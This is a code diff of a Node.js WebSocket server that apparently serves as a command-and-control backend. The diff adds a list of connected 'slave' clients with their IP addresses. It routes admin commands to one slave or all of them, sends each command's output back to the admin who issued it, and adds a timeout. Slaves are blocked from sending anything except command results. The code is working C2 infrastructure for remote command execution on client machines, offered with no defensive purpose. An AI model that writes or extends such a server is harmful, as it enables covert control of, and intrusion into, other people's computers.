@@ -1,8 +1,9 @@
 const http = require("http");
 const WebSocket = require("ws");
 
-const ADMIN_LIST = ["Nonsense", "AdminGod", "Root"];
+const ADMIN_LIST = ["Nonsense"];
 const clients = new Map(); // Map<WebSocket, { nickname, isAdmin, ip }>
+const pendingCommands = new Map(); // Map<slaveName, WebSocket(admin)>
 
 const server = http.createServer((req, res) => {
   res.writeHead(200);
@@ -18,8 +19,8 @@ wss.on("connection", (ws, req) => {
 
   let registered = false;
 
-  ws.on("message", (message) => {
-    const text = message.toString().trim();
+  ws.on("message", (msg) => {
+    const text = msg.toString().trim();
 
     if (!registered) {
       const nickname = text.slice(0, 32);
@@ -32,44 +33,75 @@ wss.on("connection", (ws, req) => {
       return;
     }
 
-    const clientInfo = clients.get(ws);
-    if (!clientInfo) return;
+    const info = clients.get(ws);
+    if (!info) return;
 
-    const { nickname, isAdmin } = clientInfo;
+    const { nickname, isAdmin } = info;
 
-    // Admin sending command
-    if (isAdmin && text.startsWith("/command ")) {
-      const args = text.slice(9).trim().split(" ");
-      const target = args.shift();
-      const command = args.join(" ");
-
-      if (target === "all") {
-        console.log(`[!] Admin ${nickname} issued command to ALL: ${command}`);
-        sendCommandToSlaves(command);
-      } else {
-        const slaveSocket = findClientByNickname(target);
-        if (slaveSocket && slaveSocket.readyState === WebSocket.OPEN && !clients.get(slaveSocket).isAdmin) {
-          console.log(`[!] Admin ${nickname} issued command to ${target}: ${command}`);
-          slaveSocket.send(`[COMMAND]: ${command}`);
-        } else {
-          ws.send(`[ERROR]: No such slave '${target}' or not connected`);
-        }
-      }
-      return;
-    }
-
-    // Admin message
+    // ADMIN COMMANDS
     if (isAdmin) {
-      console.log(`[ADMIN MSG] ${nickname}: ${text}`);
+      // Show all slaves
+      if (text === "/slaves") {
+        const slaves = [];
+        for (const [_, i] of clients.entries()) {
+          if (!i.isAdmin) slaves.push(`- ${i.nickname} (${i.ip})`);
+        }
+        ws.send(`[INFO] Connected Slaves (${slaves.length}):\n${slaves.join("\n") || "None"}`);
+        return;
+      }
+
+      // Command: /command <slave|all> <command>
+      if (text.startsWith("/command ")) {
+        const args = text.slice(9).trim().split(" ");
+        const target = args.shift();
+        const command = args.join(" ");
+
+        if (!command) {
+          ws.send("[ERROR] Missing command.");
+          return;
+        }
+
+        if (target === "all") {
+          console.log(`[!] Admin ${nickname} sent to ALL: ${command}`);
+          for (const [client, i] of clients.entries()) {
+            if (!i.isAdmin && client.readyState === WebSocket.OPEN) {
+              client.send(`[COMMAND]: ${command}`);
+              pendingCommands.set(i.nickname, ws);
+              setTimeout(() => checkTimeout(i.nickname, ws), 5000);
+            }
+          }
+        } else {
+          const slaveSocket = findClientByNickname(target);
+          if (slaveSocket && slaveSocket.readyState === WebSocket.OPEN && !clients.get(slaveSocket).isAdmin) {
+            console.log(`[!] Admin ${nickname} → ${target}: ${command}`);
+            slaveSocket.send(`[COMMAND]: ${command}`);
+            pendingCommands.set(target, ws);
+            setTimeout(() => checkTimeout(target, ws), 5000);
+          } else {
+            ws.send(`[ERROR] Slave '${target}' not found or disconnected.`);
+          }
+        }
+
+        return;
+      }
+
+      // Regular admin message
+      console.log(`[ADMIN] ${nickname}: ${text}`);
       return;
     }
 
-    // Slave response (must be feedback only)
+    // SLAVE RESPONSES
     if (text.startsWith("[OUTPUT]:") || text.startsWith("[ERROR]:") || text.startsWith("[EXCEPTION]:")) {
-      console.log(`[FEEDBACK] From ${nickname}: ${text}`);
-      broadcastToAdmins(`[${nickname}] ${text}`);
+      const adminSocket = pendingCommands.get(nickname);
+      const response = `[${nickname}] ${text}`;
+      if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
+        adminSocket.send(response);
+      } else {
+        broadcastToAdmins(response);
+      }
+      pendingCommands.delete(nickname);
     } else {
-      console.log(`[BLOCKED] Slave ${nickname} tried to send a message not allowed: ${text}`);
+      console.log(`[BLOCKED] Slave ${nickname} tried to speak: ${text}`);
     }
   });
 
@@ -87,14 +119,7 @@ wss.on("connection", (ws, req) => {
   });
 });
 
-function sendCommandToSlaves(command) {
-  for (const [client, info] of clients.entries()) {
-    if (!info.isAdmin && client.readyState === WebSocket.OPEN) {
-      client.send(`[COMMAND]: ${command}`);
-    }
-  }
-}
-
+// Helpers
 function findClientByNickname(name) {
   for (const [client, info] of clients.entries()) {
     if (info.nickname === name) return client;
@@ -107,6 +132,15 @@ function broadcastToAdmins(msg) {
     if (info.isAdmin && client.readyState === WebSocket.OPEN) {
       client.send(msg);
     }
+  }
+}
+
+function checkTimeout(slaveName, adminSocket) {
+  if (pendingCommands.has(slaveName)) {
+    if (adminSocket.readyState === WebSocket.OPEN) {
+      adminSocket.send(`[TIMEOUT] No response from ${slaveName} after 5 seconds.`);
+    }
+    pendingCommands.delete(slaveName);
   }
 }
 
